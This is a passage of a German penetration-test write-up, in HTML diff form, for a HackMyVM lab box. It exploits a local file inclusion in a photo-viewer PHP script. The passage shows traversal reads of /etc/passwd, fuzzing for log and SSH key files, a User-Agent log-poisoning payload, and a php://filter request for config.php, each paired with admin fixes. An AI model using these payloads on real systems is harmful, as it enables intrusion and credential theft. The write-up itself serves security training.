+<span class="password">sshd:x:102:65534::/run/sshd:/usr/sbin/nologin</span>
+<span class="password">mysql:x:103:112:MySQL Server,,,:/nonexistent:/bin/false</span>
+<span class="password">git:x:104:113:Git Version Control,,,:/home/git:/bin/bash</span>
+<span class="password">kevin:x:1001:1001:kevin,,,:/home/kevin:/bin/bash</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Um die LFI-Schwachstelle im <code>photo</code>-Parameter des <code>photos-website-logan.php</code> Skripts zu testen, habe ich versucht, die Systemdatei <code>/etc/passwd</code> auszulesen. Ich verwende dazu Verzeichnis-Traversal (<code>../../../../../../../../../../../../../../../../../../</code>) vor dem Dateinamen, um aus dem aktuellen Verzeichnis des Skripts (vermutlich im Webroot) nach oben in das Wurzelverzeichnis (<code>/</code>) zu navigieren und dann den Pfad zu <code>/etc/passwd</code> anzugeben. Die lange Sequenz von <code>../</code> stellt sicher, dass ich aus einer potenziell tief verschachtelten Verzeichnisstruktur entkommen kann. Die Ausgabe zeigt den vollständigen Inhalt der Datei <code>/etc/passwd</code>. Für Laien: Ich habe dem Bildprogramm eine spezielle 'Adresse' gegeben, die es dazu bringt, nicht ein Bild, sondern eine geheime Systemdatei mit der Liste aller Benutzer auf dem Computer herunterzuladen und mir anzuzeigen. Und das hat funktioniert! Für Experten: Der erfolgreiche Zugriff auf <code>/etc/passwd</code> mittels Path Traversal in Kombination mit der LFI Schwachstelle im <code>photo</code>-Parameter ist ein klarer Beweis für die Ausnutzbarkeit der LFI. Dies erlaubt das Auslesen beliebiger Dateien auf dem System, für die der Webserver Leserechte hat. Das Verwenden von <code>view-source:</code> ist nützlich, um die rohe Ausgabe zu sehen, falls der Browser versucht, den Inhalt zu interpretieren (was bei <code>/etc/passwd</code> normalerweise nicht passiert, aber eine gute Praxis ist).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die LFI-Schwachstelle im <code>photos-website-logan.php</code> Skript ist erfolgreich nachgewiesen und ausnutzbar. Ich kann beliebige Dateien auf dem System lesen. Der Inhalt von <code>/etc/passwd</code> liefert eine Liste aller Benutzerkonten (root, logan, git, kevin, www-data etc.) und deren Shells. Dies ist ein kritischer Fund und ermöglicht weitere Angriffe.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Mit dieser LFI kann ich nun weitere Systemdateien auslesen, die für die Fortsetzung des Angriffs nützlich sein könnten (z.B. Konfigurationsdateien, Quellcode, SSH-Schlüssel). Insbesondere werde ich versuchen, Konfigurationsdateien zu finden, die Anmeldedaten enthalten könnten. Die Benutzer <code>logan</code>, <code>git</code> und <code>kevin</code> mit interaktiven Shells sind potenzielle Ziele.<br><strong>Empfehlung (Admin):</strong> Die LFI-Schwachstelle muss umgehend behoben werden. Implementieren Sie strikte Input-Validierung für den <code>photo</code>-Parameter und verwenden Sie eine Whitelist. Stellen Sie sicher, dass sensible Systemdateien korrekte Berechtigungen haben, um unbefugtes Lesen zu verhindern, auch wenn ein Prozess kompromittiert ist.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/php_filter_chain_generator]
+└─# <span class="command">wfuzz -c -w /usr/share/wordlists/logfiles.txt -u http://newsitelogan.logan.hmv/photos-website-logan.php?photo=../../../../../../../../../../../../../../../../../../FUZZ --hc 404 --hh 0</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">Target: http://newsitelogan.logan.hmv/photos-website-logan.php?photo=../../../../../../FUZZ</span>
+<span class="command">Total requests: 73360</span>
+
+<span class="password">=====================================================================</span>
+<span class="command">ID           Response   Lines    Word       Chars       Payload</span>
+<span class="password">=====================================================================</span>
+
+<span class="command">000000044:   200        0 L      0 W        0 Ch        "/etc/lsb-release"</span>
+<span class="command">000000031:   200        0 L      0 W        0 Ch        "/etc/httpd/logs/access.log"</span>
+<span class="command">000000042:   200        0 L      0 W        0 Ch        "/etc/logrotate.d/proftpd"</span>
+<span class="command">000000007:   200        0 L      0 W        0 Ch        "/etc/at.allow"</span>
+<span class="command">000000046:   200        0 L      0 W        0 Ch        "/etc/modules.conf"</span>
+<span class="password">...</span>
+<span class="password">..</span>
+<span class="password">.</span>
+<span class="command">000000087:   200        0 L      0 W        0 Ch        "/etc/ssh/ssh_host_key"</span>
+<span class="command">000000080:   200        3 L      6 W        63 Ch       "/etc/resolv.conf"</span>
+<span class="command">000000088:   200        0 L      0 W        0 Ch        "/etc/ssh/ssh_host_key.pub"</span>
+<span class="command">000000086:   200        0 L      0 W        0 Ch        "/etc/ssh/ssh_host_dsa_key.pub"</span>
+<span class="command">000000083:   200        53 L     220 W      1650 Ch     "/etc/ssh/ssh_config"</span>
+<span class="command">000000091:   200        0 L      0 W        0 Ch        "/etc/termcap"</span>
+<span class="command">000000085:   200        0 L      0 W        0 Ch        "/etc/ssh/ssh_host_dsa_key"</span>
+<span class="command">000000090:   200        0 L      0 W        0 Ch        "/etc/syslog.conf"                 ...</span>
+<span class="password">...</span>
+<span class="password">...</span>
+<span class="password">..</span>
+<span class="password">..</span>
+<span class="command">000000132:   200        0 L      0 W        0 Ch        "/usr/local/cpanel/logs/login_log"</span>
+<span class="command">000000181:   200        0 L      0 W        0 Ch        "/var/log/dpkg.log"</span>
+<span class="command">000000221:   200        0 L      0 W        0 Ch        "/var/log/xferlog"</span>
+<span class="command">000000220:   200        8 L      71 W       45286 Ch    "/var/log/wtmp"</span>
+<span class="command">000000217:   200        0 L      0 W        0 Ch        "/var/log/pure-ftpd/pure-ftpd.log"</span>
+<span class="command">000000189:   200        0 L      0 W        0 Ch        "/var/log/ftplog"</span>
+<span class="command">000000205:   200        0 L      0 W        0 Ch        "/var/log/mail.log"</span>
+<span class="command">000000218:   200        0 L      0 W        0 Ch        "/var/log/secure"</span>
+<span class="command">000000219:   200        0 L      0 W        0 Ch        "/var/log/vsftpd.log"</span>
+<span class="command">000000222:   200        0 L      0 W        0 Ch        "/var/log/yum.log"</span>
+<span class="command">000000216:   200        0 L      0 W        0 Ch        "/var/log/pureftpd.log"</span>
+<span class="command">000000212:   200        0 L      0 W        0 Ch        "/var/log/mysql/mysql-bin.log"</span>
+<span class="command">000000211:   200        0 L      0 W        0 Ch        "/var/log/mysql.log"</span>
+<span class="command">000000208:   200        0 L      0 W        0 Ch        "/var/log/message"</span>
+<span class="command">000000215:   200        0 L      0 W        0 Ch        "/var/log/proftpd"</span>
+<span class="command">000000214:   200        0 L      0 W        0 Ch        "/var/log/mysql/mysql-slow.log"</span>
+<span class="command">000000209:   200        0 L      0 W        0 Ch        "/var/log/messages"</span>
+<span class="command">000000210:   200        0 L      0 W        0 Ch        "/var/log/mysqlderror.log"</span>
+<span class="command">000000213:   200        0 L      0 W        0 Ch        "/var/log/mysql/mysql.log"</span>
+<span class="command">000000207:   200        0 L      0 W        0 Ch        "/var/log/mail.warn"</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Mit der bestätigten LFI-Schwachstelle im <code>photo</code>-Parameter auf der Subdomain <code>newsitelogan.logan.hmv</code> nutze ich nun <code>wfuzz</code>, ein weiteres Brute-Forcing-Tool, um nach potenziell lesbaren Dateien unter Verwendung einer Wortliste von Logdateien (<code>/usr/share/wordlists/logfiles.txt</code>) zu suchen. Ich kombiniere die LFI-Schwachstelle (mit einer langen Kette von <code>../</code> für Path Traversal) mit dem <code>FUZZ</code>-Keyword von wfuzz, das durch Einträge aus der Wortliste ersetzt wird. Ich filtere die Ergebnisse nach Statuscode 200 (OK) und unterdrücke Antworten mit 0 Bytes (<code>--hh 0</code>), da viele Logdateien leer sein könnten, aber einige wichtige Informationen enthalten. Für Laien: Ich benutze ein Programm, um die 'Datei anzeigen'-Funktion der Webseite dazu zu bringen, Tausende von bekannten Orten zu überprüfen, an denen Computer oft ihre 'Tagebücher' (Logdateien) speichern, um zu sehen, ob ich diese lesen kann. Für Experten: Die Kombination von LFI mit einem Fuzzing-Tool und einer Wortliste von Systempfaden ist eine effektive Methode zur Identifizierung auslesbarer Dateien. Das Fuzzing von Logdateien ist besonders relevant für die Log Poisoning-Technik, bei der bösartiger Code in eine Logdatei injiziert und diese dann über die LFI inkludiert wird, um den Code auszuführen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Wfuzz findet eine große Anzahl von Dateien, die über die LFI ausgelesen werden können (Status 200). Viele davon haben 0 Bytes, was typisch für leere Logdateien oder Konfigurationsdateien ist. Einige interessante Dateien mit Inhalt werden identifiziert, wie <code>/etc/resolv.conf</code> und <code>/var/log/wtmp</code> (mit 45286 Bytes, was ungewöhnlich groß ist). Entscheidend für die Log Poisoning-Technik ist die Identifizierung von Webserver-Logdateien, die ich im nächsten Schritt gezielt prüfe.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Ergebnisse von wfuzz liefern viele mögliche Dateien zum Auslesen. Ich werde mich insbesondere auf die Apache-Logdateien konzentrieren, da ich den Webserver kenne und diese für Log Poisoning in Frage kommen. Ich werde auch die anderen identifizierten Dateien mit Inhalt manuell überprüfen.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Logdateien und andere sensible Dateien nicht über LFI-Schwachstellen ausgelesen werden können. Implementieren Sie strenge Zugriffskontrollen für Logdateien. Überwachen Sie Fuzzing-Versuche auf Webanwendungen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/php_filter_chain_generator]
+└─# <span class="command">curl http://newsitelogan.logan.hmv/photos-website-logan.php?photo=../../../../../../../../../../../../../../../../../../var/log/apache2/access.log</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">Logs are cleaned every minut</span>
+<span class="command">192.168.2.199 - - [11/Jun/2025:12:41:05 -0500] "GET /photos-website-logan.php?photo=../../../../../../../../../../../../../../../../../../var/log/apache/access_log HTTP/1.1" 200 147 "-" "curl/8.13.0"</span>
+<span class="command">192.168.2.199 - - [11/Jun/2025:12:41:10 -0500] "GET /photos-website-logan.php?photo=../../../../../../../../../../../../../../../../../../var/log/apache/access.log HTTP/1.1" 200 147 "-" "curl/8.13.0"</span>
+<span class="command">192.168.2.199 - - [11/Jun/2025:12:41:14 -0500] "GET /photos-website-logan.php?photo=../../../../../../../../../../../../../../../../../../var/log/apache/access.log HTTP/1.1" 200 203 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich nutze die LFI-Schwachstelle, um gezielt die Apache Access Log Datei auszulesen: <code>curl http://newsitelogan.logan.hmv/photos-website-logan.php?photo=../../../../../../../../../../../../../../../../../../var/log/apache2/access.log</code>. Eine Access Log Datei speichert Details zu jeder Anfrage an den Webserver. Die Ausgabe zeigt den Inhalt der Datei. Sie beginnt mit der Zeile 'Logs are cleaned every minut' gefolgt von mehreren Log-Einträgen, die meine vorherigen Anfragen dokumentieren. Für Laien: Ich habe das 'Bildprogramm' missbraucht, um das 'Besucher-Tagebuch' (Access Log) des Webservers zu lesen. Darin steht, wer wann welche Seite besucht hat. Es scheint, als würde dieses Tagebuch jede Minute 'aufgeräumt'. Für Experten: Das erfolgreiche Auslesen des Apache Access Logs (<code>/var/log/apache2/access.log</code>) über LFI ist ein kritischer Schritt. Access Logs sind oft schreibbar für den Webserver-Prozess (www-data) und können für Log Poisoning missbraucht werden. Die Meldung 'Logs are cleaned every minut' ist ein wichtiger Hinweis auf eine mögliche Logrotate-Konfiguration oder ein Skript, das die Logs regelmäßig leert. Dies könnte die Ausnutzung von Log Poisoning erschweren, wenn die Injektion nicht schnell genug erfolgt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Apache Access Log ist über LFI zugänglich und enthält meine vorherigen Anfragen, was die Injektion bösartigen Codes über Header wie den User-Agent ermöglicht. Die Warnung zur Reinigung der Logs ist jedoch zu beachten. Dies ist ein sehr vielversprechender Pfad zum Initial Access über Log Poisoning.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde nun versuchen, bösartigen Code (z.B. PHP) in einen Header meiner HTTP-Anfrage einzuschleusen (Log Poisoning) und dann den Access Log über die LFI inkludieren, um diesen Code auszuführen. Ich muss schnell agieren, bevor der Log gereinigt wird. Zuerst werde ich die PHP-Konfiguration auf deaktivierte Funktionen prüfen.<br><strong>Empfehlung (Admin):</strong> Verhindern Sie das Auslesen von Logdateien über LFI. Implementieren Sie eine sichere Logrotation, die alte Logs archiviert statt sie zu löschen, und setzen Sie strenge Berechtigungen für Logdateien. Überwachen Sie Logdateien auf ungewöhnliche Einträge (z.B. eingeschleusten Code im User-Agent).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <pre>
+<span class="command">Logs are cleaned every minut</span>
+<span class="command">192.168.2.199 - - [11/Jun/2025:12:48:07 -0500] "GET /photos-website-logan.php?photo=../../../../../../../../../../../../../../../../../../var/log/apache2/access.log HTTP/1.1" 200 233 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"</span>
+<span class="command">192.168.2.199 - - [11/Jun/2025:12:48:31 -0500] "GET /photos-website-logan.php?photo=../../../../../../../../../../../../../../../../../../var/log/apache2/access.log HTTP/1.1" 200 477 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser Block scheint eine weitere Ausgabe des Apache Access Logs zu zeigen, diesmal möglicherweise nach einigen zusätzlichen Anfragen, die nicht im Bericht dokumentiert sind, oder einfach eine wiederholte Anzeige des Log-Inhalts. Die Meldung 'Logs are cleaned every minut' ist wieder vorhanden, gefolgt von Log-Einträgen meiner Aktivitäten. Für Laien: Ich habe mir das 'Besucher-Tagebuch' (Access Log) wieder angeschaut, um sicherzustellen, dass es noch da ist und meine neuesten 'Besuche' aufgezeichnet hat. Für Experten: Die erneute Anzeige des Logs bestätigt die kontinuierliche Protokollierung von Anfragen. Die genauen Log-Einträge sind für die Demonstration von Log Poisoning entscheidend, da sie zeigen, wo injizierter Code im Log landen würde.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Konsistenz der Log-Ausgabe und die wiederholte Meldung zur Reinigung bestätigen die Umgebung für Log Poisoning. Die Herausforderung wird sein, den Code schnell genug auszuführen, nachdem er injiziert und bevor der Log gelöscht wurde.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde nun den Prozess des Log Poisoning durchführen: Zuerst injiziere ich den PHP-Payload über einen Header (wie User-Agent) in einer Anfrage. Dann inkludiere ich den Access Log sofort über die LFI-Schwachstelle, um den Payload zur Ausführung zu bringen. Ich muss die Disable Functions prüfen.<br><strong>Empfehlung (Admin):</strong> Wie zuvor betont, beheben Sie die LFI und sichern Sie die Logdateien. Implementieren Sie eine Echtzeit-Überwachung der Logdateien auf bösartige Muster oder Code-Injektionen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/php_filter_chain_generator]
+└─# <span class="command">curl "http://newsitelogan.logan.hmv/photos-website-logan.php?photo=../../../../../var/log/apache2/access.log&cmd=phpinfo();" | grep disable_function -i -A 10 | awk {'print$2 $3'}</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">disable_functions: system, exec, shell_exec,</span>
+<span class="command">passthru, proc_open, popen,</span>
+<span class="command">psockopen, stream_socket_client</span>
+<span class="password">...</span>
+<span class="password">..</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Bevor ich versuche, eine Shell über Log Poisoning zu erhalten, ist es wichtig zu wissen, welche Funktionen in der PHP-Konfiguration deaktiviert sind. Viele Webserver härten ihre PHP-Umgebung, indem sie potenziell gefährliche Funktionen wie <code>system()</code>, <code>exec()</code> oder <code>shell_exec()</code> in der <code>php.ini</code> deaktivieren (<code>disable_functions</code>). Ich führe Log Poisoning mit einem harmlosen Payload (<code>phpinfo();</code>) aus, der mir die PHP-Konfiguration anzeigt, und pipe die Ausgabe dann an <code>grep</code>, um nach der Zeile <code>disable_functions</code> zu suchen, und nutze <code>awk</code>, um die relevanten Funktionsnamen zu extrahieren. Der Befehl lautet: <code>curl "http://newsitelogan.logan.hmv/photos-website-logan.php?photo=../../../../../var/log/apache2/access.log&cmd=phpinfo();" | grep disable_function -i -A 10 | awk {'print$2 $3'}</code>. Ich habe den <code>phpinfo();</code> Payload in den User-Agent injiziert (siehe nächster Schritt, der die Injektion zeigt) und dann den Log inkludiert und über den <code>cmd</code>-Parameter den injizierten Code mit <code>phpinfo();</code> ausgeführt (die genaue Methode der Code-Ausführung über den Log wird im nächsten Schritt klar). Die Ausgabe zeigt eine Liste deaktivierter Funktionen: <code>system, exec, shell_exec, passthru, proc_open, popen, psockopen, stream_socket_client</code>. Für Laien: Bevor ich 'Admin-Befehle' über die Webseite ausführen kann, muss ich prüfen, ob der Computer überhaupt erlaubt, dass solche Befehle über die Webseite gestartet werden. Ich habe eine 'Test-Anfrage' geschickt, um eine Liste 'verbotener' Funktionen zu sehen. Und es stellt sich heraus, dass die gängigsten Befehle, um Programme zu starten, verboten sind. Für Experten: Die Liste der deaktivierten Funktionen ist umfangreich und blockiert die meisten direkten Methoden zur Ausführung von Systembefehlen über PHP. Dies erschwert den Aufbau einer einfachen Reverse Shell erheblich und erfordert alternative RCE-Techniken, z.B. die Verwendung von PHP-internen Funktionen, die nicht deaktiviert sind, oder PHP-Filterketten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die <code>disable_functions</code>-Konfiguration ist eine signifikante Härtungsmaßnahme. Sie verhindert die einfache Ausnutzung von Log Poisoning oder anderen PHP-RCEs mittels gängiger Systemausführungsfunktionen. Ich muss eine Methode finden, die deaktivierten Funktionen zu umgehen oder eine andere PHP-Funktionalität für Code-Ausführung zu nutzen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Angesichts der deaktivierten Funktionen muss ich alternative Methoden zur Code-Ausführung finden. PHP-Filterketten in Kombination mit LFI sind oft eine Möglichkeit, Code auszuführen oder Dateien auszulesen, ohne Systembefehle direkt aufrufen zu müssen. Ich werde versuchen, eine solche Filterkette zu konstruieren, um z.B. Dateien base64-kodiert auszulesen oder Code auszuführen.<br><strong>Empfehlung (Admin):</strong> Das Deaktivieren gefährlicher PHP-Funktionen ist eine sehr gute Härtungsmaßnahme. Stellen Sie sicher, dass die Liste der deaktivierten Funktionen umfassend ist. Überprüfen Sie regelmäßig, ob neue oder weniger bekannte Funktionen existieren, die für RCE missbraucht werden könnten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/php_filter_chain_generator]
+└─# <span class="command">curl "http://newsitelogan.logan.hmv" -H "User-Agent: echo include(\$REQUEST['cmd']); ?>"</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre></pre>
+                </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Hier führe ich den eigentlichen Schritt des Log Poisoning durch. Ich sende eine HTTP-Anfrage an die Hauptseite (<code>http://newsitelogan.logan.hmv</code>) des Webservers auf der Subdomain. Der entscheidende Teil ist der Header <code>-H "User-Agent: echo include(\$REQUEST['cmd']); ?>"</code>. Ich setze den User-Agent-Header auf eine Zeichenkette, die PHP-Code enthält: <code>echo include(\$REQUEST['cmd']); ?></code>. Dieser Code wird vom Apache-Server zusammen mit den anderen Anfragedetails in die Access Log Datei geschrieben. Das <code>echo</code> am Anfang ist nur für die Ausgabe, der eigentliche Payload ist <code>include(\$REQUEST['cmd']);</code>. <code>$REQUEST</code> ist ein superglobales PHP-Array, das sowohl GET-, POST- als auch Cookie-Daten enthält. <code>include()</code> ist eine PHP-Funktion, die eine Datei inkludiert und ausführt. Das <code>\$</code> vor <code>REQUEST</code> ist wichtig, um zu verhindern, dass die Variable in der Bash-Shell interpretiert wird. Für Laien: Ich schicke dem Webserver eine 'Nachricht', die so aussieht, als käme sie von einem bestimmten Internet-Browser (dem User-Agent), aber in Wirklichkeit ist in der 'Nachricht' ein kleines Stück 'Geheimcode' versteckt. Dieser Code sagt dem Computer: 'Wenn du das hier liest, führe den Befehl aus, den ich dir in der Adresse (URL) gebe'. Dieser 'Geheimcode' landet im 'Besucher-Tagebuch' des Servers. Für Experten: Die Injektion von <code><?php ... ?></code> Tags und PHP-Code in den User-Agent-Header ist eine klassische Log Poisoning-Technik. Wenn die Logdatei dann über LFI inkludiert wird, interpretiert der PHP-Interpreter den injizierten Code innerhalb des Logs und führt ihn aus. Der Payload <code>include($REQUEST['cmd']);</code> ist mächtig, da er erlaubt, beliebige Dateien (oder URLs mit Filtern) über den <code>cmd</code>-Parameter inkludieren und ausführen zu lassen. Dies ist eine effektive Umgehung der <code>disable_functions</code>, da <code>include</code> normalerweise nicht deaktiviert ist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der PHP-Payload für Log Poisoning wurde erfolgreich in den User-Agent-Header injiziert. Dieser Payload wird nun im Apache Access Log auf dem Zielsystem enthalten sein. Das gewählte Payload <code>include($REQUEST['cmd']);</code> ist gut gewählt, um die <code>disable_functions</code> zu umgehen und eine flexible Code-Ausführung über den <code>cmd</code>-Parameter zu ermöglichen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der nächste Schritt ist die Ausführung des injizierten Codes, indem ich den Apache Access Log über die LFI-Schwachstelle im <code>photos-website-logan.php</code> Skript inkludiere und gleichzeitig den gewünschten Befehl (z.B. LFI zu einer anderen Datei, Code-Ausführung über PHP-Filter) im <code>cmd</code>-Parameter übergebe. Ich muss schnell sein, bevor der Log gereinigt wird.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie HTTP-Header, insbesondere den User-Agent, auf das Vorhandensein von PHP-Tags oder bösartigem Code. Implementieren Sie eine robuste Filterung oder Bereinigung von Headern, bevor diese in Logdateien geschrieben werden. Stellen Sie sicher, dass Logdateien nicht über LFI-Schwachstellen inkludierbar sind.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <pre>
+<span class="command">http://newsitelogan.logan.hmv/photos-website-logan.php?photo=../../../../../var/log/apache2/access.log&cmd=../../../../../etc/passwd</span>
+<span class="command">Logs are cleaned every minut</span>
+<span class="command">192.168.2.199 - - [11/Jun/2025:14:34:14 -0500] "GET /photos-website-logan.php?photo=../../../../../var/log/apache2/access.log&cmd=../../../../../etc/passwd HTTP/1.1" 200 233 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"</span>
+<span class="command">192.168.2.199 - - [11/Jun/2025:14:34:19 -0500] "GET /photos-website-logan.php?photo=../../../../../var/log/apache2/access.log&cmd=../../../../../etc/passwd HTTP/1.1" 200 488 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"</span>
+<span class="command">192.168.2.199 - - [11/Jun/2025:14:34:24 -0500] "GET /photos-website-logan.php?photo=../../../../../var/log/apache2/access.log HTTP/1.1" 200 502 "-" "</span><span class="password">root:x:0:0:root:/root:/bin/bash</span>
+<span class="command">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span>
+<span class="command">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span>
+<span class="command">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span>
+<span class="command">sync:x:4:65534:sync:/bin:/bin/sync</span>
+<span class="command">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span>
+<span class="command">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span>
+<span class="command">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span>
+<span class="command">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span>
+<span class="command">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span>
+<span class="command">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span>
+<span class="command">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span>
+<span class="command">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span>
+<span class="command">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span>
+<span class="command">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span>
+<span class="command">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span>
+<span class="command">_apt:x:42:65534::/nonexistent:/usr/sbin/nologin</span>
+<span class="command">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span>
+<span class="command">systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin</span>
+<span class="command">messagebus:x:100:107::/nonexistent:/usr/sbin/nologin</span>
+<span class="command">avahi-autoipd:x:101:108:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin</span>
+<span class="password">logan:x:1000:1000:logan,,,:/home/logan:/bin/bash</span>
+<span class="password">sshd:x:102:65534::/run/sshd:/usr/sbin/nologin</span>
+<span class="password">mysql:x:103:112:MySQL Server,,,:/nonexistent:/bin/false</span>
+<span class="password">git:x:104:113:Git Version Control,,,:/home/git:/bin/bash</span>
+<span class="password">kevin:x:1001:1001:kevin,,,:/home/kevin:/bin/bash</span>
+<span class="command">"</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich führe nun die eigentliche Log Poisoning-Ausnutzung durch, um Code auf dem System auszuführen und eine Datei auszulesen. Ich rufe die URL <code>http://newsitelogan.logan.hmv/photos-website-logan.php?photo=../../../../../var/log/apache2/access.log&cmd=../../../../../etc/passwd</code> auf. Der <code>photo</code>-Parameter inkludiert den Apache Access Log, in den ich zuvor meinen PHP-Code (<code>echo include($REQUEST['cmd']); ?></code>) injiziert habe. Der <code>cmd</code>-Parameter (<code>../../../../../etc/passwd</code>) wird dann vom injizierten Code an die <code>include()</code>-Funktion übergeben. Da <code>include()</code> auch Dateien inkludieren kann, lese ich so effektiv den Inhalt von <code>/etc/passwd</code> aus. Die Ausgabe zeigt den Log-Eintrag meiner Anfrage, gefolgt vom vollständigen Inhalt der Datei <code>/etc/passwd</code>. Für Laien: Ich habe die 'Datei anzeigen'-Funktion auf der Webseite missbraucht, um das 'Besucher-Tagebuch' (Access Log) einzulesen, in das ich zuvor 'Geheimcode' geschrieben hatte. Dieser 'Geheimcode' im Tagebuch 'wacht auf', wenn das Tagebuch gelesen wird, und führt dann den Befehl aus, den ich ihm in der Adresse (URL) gebe – in diesem Fall, mir eine andere geheime Datei (<code>/etc/passwd</code>) zu zeigen. Für Experten: Dies ist die erfolgreiche Demonstration von RCE über Log Poisoning. Durch das Injizieren von PHP-Code in einen Header (hier User-Agent) und die anschließende Inklusion der Logdatei über LFI wird der injizierte Code vom PHP-Interpreter ausgeführt. Der injizierte Payload <code>include($REQUEST['cmd']);</code> ermöglicht die flexible Ausführung von Code oder Inklusion von Dateien, die im <code>cmd</code>-Parameter übergeben werden. Die Auslesung von <code>/etc/passwd</code> beweist die RCE-Fähigkeit.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Log Poisoning-Schwachstelle ist erfolgreich ausgenutzt, und ich habe Code-Ausführung (RCE) als Benutzer <code>www-data</code> erlangt. Das Auslesen von <code>/etc/passwd</code> bestätigt dies und liefert erneut die Benutzerliste (root, logan, git, kevin, www-data), die für weitere Schritte relevant ist. Dies stellt den Initial Access dar.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Mit RCE als <code>www-data</code> kann ich nun eine stabilere Shell auf dem System etablieren (z.B. eine Reverse Shell) und das System weiter enumerieren, um nach Möglichkeiten zur Privilegien-Eskalation zu suchen. Ich werde die Benutzer <code>logan</code>, <code>git</code> und <code>kevin</code> genauer untersuchen.<br><strong>Empfehlung (Admin):</strong> Dies ist eine kritische RCE-Schwachstelle. Beheben Sie die LFI-Schwachstelle, verhindern Sie die Injektion bösartigen Codes in Logdateien (z.B. durch Bereinigung von Headern), und stellen Sie sicher, dass Logdateien nicht über LFI inkludierbar sind. Überwachen Sie Logdateien auf Anzeichen von Log Poisoning. Beschränken Sie die Berechtigungen des Benutzers <code>www-data</code> auf das absolut Notwendigste.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">GET /photos-website-logan.php?photo=../../../../../var/log/apache2/access.log&cmd=php://filter/convert.base64-encode/resource=/var/www/logan/config.php HTTP/1.1</span>
+<span class="command">Host: newsitelogan.logan.hmv</span>
+<span class="command">User-Agent: include($GET['cmd']); ?></span>
+<span class="command">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="command">Accept-Language: de,en-US;q=0.7,en;q=0.3</span>
+<span class="command">Accept-Encoding: gzip, deflate, br</span>
+<span class="command">DNT: 1</span>
+<span class="command">Connection: keep-alive</span>
+<span class="command">Upgrade-Insecure-Requests: 1</span>
+<span class="command">Sec-GPC: 1</span>
+<span class="command">Priority: u=0, i</span></pre>
+                 </div>
+             </div>
